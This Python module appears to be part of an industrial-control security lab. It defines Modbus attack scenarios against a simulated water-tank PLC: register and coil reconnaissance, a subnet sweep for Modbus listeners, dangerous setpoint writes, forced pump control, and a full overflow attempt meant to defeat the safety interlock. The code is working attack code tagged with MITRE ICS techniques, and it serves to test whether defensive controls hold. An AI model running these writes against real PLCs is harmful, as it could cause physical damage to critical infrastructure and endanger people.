"""The attack scenarios as functions of a Modbus client.

Each returns an AttackResult describing what it attempted, what the PLC
answered, and whether its objective was achieved. "Objective achieved" means
the unsafe effect stuck (the dangerous value was accepted and still present a
scan later), so a scenario that returns success on the unprotected lab and
failure once a control is in place is exactly what tools/validate.py checks.

Register / coil map mirrors simulator/water_tank_plc.py:
  HR0 level, HR1 low_sp, HR2 high_sp, HR3 inflow, HR4 outflow, HR5 alarms
  CO0 pump, CO1 valve, CO2 auto_mode, CO3 manual_pump_cmd
"""

from __future__ import annotations

import socket
import time
from dataclasses import asdict, dataclass, field
from typing import Callable

# Protocol addresses (0-based, as sent on the wire)
LEVEL, LOW_SP, HIGH_SP, INFLOW, OUTFLOW, ALARMS = range(6)
PUMP, VALVE, AUTO, MANUAL_PUMP = range(4)
HH_LIMIT = 950  # safety interlock threshold (95.0 %)


@dataclass
class AttackResult:
    scenario: str
    attack: str                      # one-line description of the action
    mitre: list[str]
    objective_achieved: bool         # did the unsafe effect stick?
    detail: str                      # human-readable outcome
    reached_plc: bool = True         # did the attack get a Modbus response / a listener?
    evidence: dict = field(default_factory=dict)  # values read back, etc.
    error: str | None = None

    def as_dict(self) -> dict:
        return asdict(self)


class Probe:
    """Thin Modbus/TCP client wrapper (pymodbus) with the few calls the
    scenarios need, plus a plain-socket connectivity check for the sweep."""

    def __init__(self, target: str, port: int = 502, unit: int = 1, timeout: float = 3.0):
        from pymodbus.client import ModbusTcpClient

        self.target, self.port, self.unit, self.timeout = target, port, unit, timeout
        self.client = ModbusTcpClient(target, port=port, timeout=timeout)

    def __enter__(self):
        self.client.connect()
        return self

    def __exit__(self, *exc):
        self.client.close()

    # pymodbus 3.x uses the keyword "slave"; keep one place to change it.
    def read_hr(self, address: int, count: int = 1) -> list[int] | None:
        rr = self.client.read_holding_registers(address, count=count, slave=self.unit)
        return None if rr.isError() else list(rr.registers)

    def read_coils(self, address: int, count: int = 1) -> list[int] | None:
        rr = self.client.read_coils(address, count=count, slave=self.unit)
        return None if rr.isError() else [int(b) for b in rr.bits[:count]]

    def write_hr(self, address: int, value: int) -> bool:
        return not self.client.write_register(address, value, slave=self.unit).isError()

    def write_coil(self, address: int, value: bool) -> bool:
        return not self.client.write_coil(address, value, slave=self.unit).isError()


# --------------------------------------------------------------------------- #
def recon(p: Probe) -> AttackResult:
    """T0861/T0801: read the whole process state (no writes)."""
    regs = p.read_hr(LEVEL, 6)
    coils = p.read_coils(PUMP, 4)
    if regs is None or coils is None:
        return AttackResult("recon", "read HR0-5 and coils 0-3", ["T0886", "T0861"],
                            False, "PLC did not answer the read (blocked?)", reached_plc=False,
                            error="no response")
    return AttackResult(
        "recon", "read HR0-5 and coils 0-3", ["T0886", "T0861"],
        objective_achieved=True,
        detail=(f"level={regs[LEVEL]/10:.1f}% low_sp={regs[LOW_SP]/10:.1f}% "
                f"high_sp={regs[HIGH_SP]/10:.1f}% pump={'ON' if coils[PUMP] else 'OFF'}"),
        evidence={"holding_registers": regs, "coils": coils})


def sweep(p: Probe, subnet: str = "10.30.30.0/24", port: int = 502, limit: int = 32) -> AttackResult:
    """T0846: TCP-connect sweep for Modbus listeners across the OT subnet."""
    import ipaddress

    hosts = list(ipaddress.ip_network(subnet, strict=False).hosts())[:limit]
    found = []
    for ip in hosts:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.3)
        try:
            if s.connect_ex((str(ip), port)) == 0:
                found.append(str(ip))
        finally:
            s.close()
    return AttackResult("sweep", f"TCP sweep of {port}/tcp across {subnet}", ["T0846"],
                        objective_achieved=bool(found),
                        detail=f"Modbus listeners found: {', '.join(found) or 'none'}",
                        reached_plc=bool(found),
                        evidence={"hosts_scanned": len(hosts), "listeners": found})


def _stuck(p: Probe, address: int, value: int, reader: Callable[[int, int], list[int] | None],
           settle: float = 1.2) -> bool:
    """True if `value` is still at `address` after one PLC scan — i.e. the
    controller accepted it and didn't clamp/override it."""
    time.sleep(settle)
    read = reader(address, 1)
    return read is not None and read[0] == value


def setpoint(p: Probe) -> AttackResult:
    """T0836: write a dangerous high setpoint to force overflow. The PLC's
    input validation (SR 3.5) should reset an out-of-range setpoint."""
    target = 990  # 99.0 %, outside the valid 60-90 % band
    ok = p.write_hr(HIGH_SP, target)
    stuck = _stuck(p, HIGH_SP, target, p.read_hr) if ok else False
    now = p.read_hr(HIGH_SP, 1)
    return AttackResult("setpoint", f"write HR2 high_setpoint = {target} (99.0%)", ["T0836"],
                        objective_achieved=stuck,
                        detail=("accepted and still 99.0% — no input validation" if stuck
                                else f"write {'accepted' if ok else 'rejected'}, "
                                     f"controller reset it to {now[0]/10:.1f}%" if now else "no readback"),
                        reached_plc=bool(ok or now is not None),
                        evidence={"written": target, "readback": now})


def pump(p: Probe) -> AttackResult:
    """T0855: write the PLC-owned pump coil directly."""
    ok = p.write_coil(PUMP, True)
    stuck = _stuck(p, PUMP, 1, p.read_coils) if ok else False
    return AttackResult("pump", "write coil 0 (pump) = ON", ["T0855"],
                        objective_achieved=stuck,
                        detail=("pump forced ON and held" if stuck
                                else "write did not hold — PLC re-asserted control"),
                        reached_plc=bool(ok),
                        evidence={"pump_after": p.read_coils(PUMP, 1)})


def mode(p: Probe) -> AttackResult:
    """T0858: change operating mode AUTO->MANUAL, then command the pump."""
    p.write_coil(AUTO, False)
    p.write_coil(MANUAL_PUMP, True)
    coils = p.read_coils(PUMP, 4)
    manual_now = coils is not None and coils[AUTO] == 0
    return AttackResult("mode", "write coil 2 auto=0 (MANUAL), coil 3 manual_pump=1", ["T0858", "T0855"],
                        objective_achieved=bool(manual_now),
                        detail="switched to MANUAL and commanded the pump" if manual_now
                               else "mode change did not hold",
                        reached_plc=coils is not None,
                        evidence={"coils_after": coils})


def overflow(p: Probe) -> AttackResult:
    """T0831/T0880: the full overflow attempt — close the drain, raise the
    setpoint, force the pump — and check whether the tank is driven past the
    safety interlock. The interlock (level>=95% -> pump OFF) should hold."""
    p.write_coil(VALVE, False)     # close the outlet so nothing drains
    p.write_hr(HIGH_SP, 990)       # raise the ceiling
    p.write_coil(AUTO, False)
    p.write_coil(MANUAL_PUMP, True)
    p.write_coil(PUMP, True)
    # Let the process run and watch the level. "Breach" means the tank is
    # actually overflowing (near full, ~99 %+): the interlock caps a contained
    # tank at ~95-97 %, so one scan of overshoot is not a breach. We also stop
    # early once the level has settled against the interlock ceiling.
    OVERFLOW_LEVEL = 990  # 99.0 %: the interlock has failed if we get here
    peak = 0
    settled = 0
    breached = False
    for _ in range(60):
        time.sleep(0.5)
        regs = p.read_hr(LEVEL, 6)
        if regs is None:
            break
        level = regs[LEVEL]
        if level >= OVERFLOW_LEVEL:
            breached = True
            peak = max(peak, level)
            break
        settled = settled + 1 if level <= peak else 0  # not rising any more
        peak = max(peak, level)
        if (regs[ALARMS] & 1) and settled >= 4:
            break  # HIGH-HIGH alarm and level held: interlock is containing it
    return AttackResult(
        "overflow", "close drain + raise setpoint + force pump to overflow the tank",
        ["T0831", "T0880", "T0836", "T0855"],
        objective_achieved=breached,
        detail=(f"OVERFLOW: tank reached {peak/10:.1f}% — interlock failed" if breached
                else f"contained: peak {peak/10:.1f}%, safety interlock capped the level near 95%"),
        reached_plc=peak > 0,
        evidence={"peak_level_pct": round(peak / 10, 1), "interlock_breached": breached})


SCENARIOS: dict[str, Callable[[Probe], AttackResult]] = {
    "recon": recon, "sweep": sweep, "setpoint": setpoint,
    "pump": pump, "mode": mode, "overflow": overflow,
}
